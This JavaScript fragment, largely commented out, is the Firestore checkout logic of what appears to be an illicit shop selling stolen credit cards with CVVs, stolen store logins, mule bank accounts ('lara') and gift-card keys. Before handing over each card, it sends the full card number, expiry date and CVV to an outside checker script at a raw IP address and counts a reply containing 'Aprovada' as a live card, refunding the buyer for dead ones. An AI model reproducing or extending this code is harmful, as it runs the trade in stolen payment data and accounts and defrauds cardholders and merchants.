// await FireStore.collection("users").doc(idUser).update({
                //     cart: {
                //         cc: [],
                //         gift: [],
                //         lara: [],
                //         login: [],
                //         consultavel: [],
                //     }
                // })

                // let moneyNow = await (await FireStore.collection("users").doc(doc.id).get()).data().money
                // await FireStore.collection("users").doc(idUser).update({
                //     money: moneyNow - cart.totalPreco
                // })

    /*await FireStore.collection("users").where("token", "==", token).get().then(async snapshot => {
            await snapshot.forEach(async doc => {
                let data = doc.data()
                let cart = await GetCart(data.user)
                let idUser = doc.id;

                if (data.money < cart.totalPreco) {
                    response = {message: "Saldo Insuficiente!", error: true}
                }else{


                await data.cart.gift.map(async (e) => {
                    for(let i = 0; i < e.quantidade; i++) {
                    await FireStore.collection('produtos').doc('gifts').get().then(async doc => {
                        let allCard = doc.data();
                        let card = allCard[e.type].filter(c => c.value === e.value);
                        let code = card[0].keys[0];
                        let lastInfos = [];
                        let codesWithoutKey = card[0].keys.filter(k => k !== code)
                        let lastCardWithnlyValue = doc.data()[e.type].filter(j => j.value === e.value)
                        let lastCardWithoutValue = doc.data()[e.type].filter(j => j.value !== e.value)


                    await FireStore.collection('users').doc(idUser).get().then(async ret => {
                        lastInfos = ret.data().infos

                            let obj = {
                                ...lastInfos, gift: [ {
                                    type: e.type,
                                    value: e.value,
                                    key: code
                                },
                                    ...lastInfos.gift
                                ]
                            }

                            await FireStore.collection('users').doc(idUser).update({
                                infos: obj
                            })

                            await FireStore.collection('produtos').doc('gifts').update({
                                [e.type]: [
                                    ...lastCardWithoutValue, {
                                        value: e.value,
                                        keys: codesWithoutKey
                                    }
                                ]
                            })

                            
                        })
                        
                        
                    })
                }
                })

                await data.cart.cc.map(async (e) => {
                    const AllCardsSnapshot = await FireStore.collection('produtos').doc('cc').get();
                    const allCards = await AllCardsSnapshot.data()[e.itemProd]
                    const cardBuy = allCards.filter(c => c.id === e.id)[0]
                    const cardsWithoutCardBuy = allCards.filter(c => c.id !== e.id)

                    if (checkCcs) {
                        let valid = cardBuy.valid.split('/')
                        await axios.default.get(`http://40.87.111.245/allbins/cielo.php?lista=${cardBuy.numero}|${valid[0]}|20${valid[1]}|${cardBuy.cvv}`)
                            .then(async res => {
                                let live = res.data.includes('Aprovada')
                                if (live) {
                                    await FireStore.collection('users').doc(idUser).update({
                                        "infos.cc": firebase.default.firestore.FieldValue.arrayUnion(cardBuy)
                                    })
                                
                                    await FireStore.collection('users').doc(idUser).update({
                                        "pontos": data.pontos + 20,
                                    })
                                
                                    await FireStore.collection('produtos').doc('cc').update({
                                        [e.itemProd]: [
                                                ...cardsWithoutCardBuy
                                            ]
                                    })

                                    response.ccLive++;

                                    console.log('card is live');
                                } else {

                                    let moneyNow = await (await FireStore.collection("users").doc(doc.id).get()).data().money
                                    await FireStore.collection('users').doc(idUser).update({
                                        "money": moneyNow + cardBuy.value,
                                    })
                                
                                    await FireStore.collection('produtos').doc('cc').update({
                                        [e.itemProd]: [
                                            ...cardsWithoutCardBuy
                                        ]
                                    })
                                    console.log('card dont live');

                                    response.ccDied++;
                                }
                            })
                    } else {
                        console.log('card dont checked');

                        await FireStore.collection('users').doc(idUser).update({
                            "infos.cc": firebase.default.firestore.FieldValue.arrayUnion(cardBuy)
                        })
                    
                        await FireStore.collection('users').doc(idUser).update({
                            "pontos": data.pontos + 20,
                        })
                    
                        await FireStore.collection('produtos').doc('cc').update({
                            [e.itemProd]: [
                                ...cardsWithoutCardBuy
                            ]
                        })
                    }
                    // console.log(response);                     
                })
            }
                

                await data.cart.lara.map(async (e, index) => {
                    const laraAllSnap = await FireStore.collection('produtos').doc('lara').get();
                    const laraAll = laraAllSnap.data().arr;
                    const laraBuy = laraAll.filter(l => l.id === e.id)[0]
                    const laraWithoutLaraBuy = laraAll.filter(l => l.id !== e.id)
        
                    await FireStore.collection('users').doc(idUser).update({
                        "infos.lara": firebase.default.firestore.FieldValue.arrayUnion(laraBuy)
                    })
                        
                    await FireStore.collection('produtos').doc('lara').update({
                        arr: [
                            ...laraWithoutLaraBuy
                        ]
                    })
                })

                await data.cart.login.map(async (e, index) => {
                    for(let i = 0; i < e.quantidade; i++) {
                        const loginAllSnap = await FireStore.collection('produtos').doc('login').get();
                        const loginAll = loginAllSnap.data().logins;
                        const loginBuy = loginAll.filter(l => l.loja === e.loja)[0]
                        const loginBuyKeys = loginAll.filter(l => l.loja === e.loja)[0].keys[0]
                        const loginWithoutloginBuyKeys = loginAll.filter(l => l.loja === e.loja)[0].keys.slice(1)

                        let loginAllWithoutBuy = loginAll.filter(l => l.loja !== e.loja)
            
                        let obj = {
                            ...loginBuyKeys,
                            loja: e.loja
                        }

                        await FireStore.collection('users').doc(idUser).update({
                            "infos.login": firebase.default.firestore.FieldValue.arrayUnion(obj)
                        })

                        await FireStore.collection('produtos').doc('login').update({
                            logins: [
                                {
                                    ...loginBuy,
                                    keys: [
                                        ...loginWithoutloginBuyKeys
                                    ]
                                },
                                ...loginAllWithoutBuy                            
                            ]
                        })
                    }
                })

                await data.cart.consultavel.map(async (e) => {
                    const consulAllSnap = await FireStore.collection('produtos').doc('consultaveis').get();
                    const consulAll = consulAllSnap.data()[e.loja];
                    const consulBuy = consulAll.filter(l => l.id === e.id)[0]
                    const consulWithoutconsulBuy = consulAll.filter(l => l.id !== e.id)
        
                    await FireStore.collection('users').doc(idUser).update({
                        "infos.consultavel": firebase.default.firestore.FieldValue.arrayUnion(consulBuy)
                    })
                        
                    await FireStore.collection('produtos').doc('consultaveis').update({
                        [e.loja]: [
                            ...consulWithoutconsulBuy
                        ]
                    })
                })

                // await FireStore.collection("users").doc(idUser).update({
                //     cart: {
                //         cc: [],
                //         gift: [],
                //         lara: [],
                //         login: [],
                //         consultavel: [],
                //     }
                // })

                // let moneyNow = await (await FireStore.collection("users").doc(doc.id).get()).data().money
                // await FireStore.collection("users").doc(idUser).update({
                //     money: moneyNow - cart.totalPreco
                // })
            }
        )    
    })*/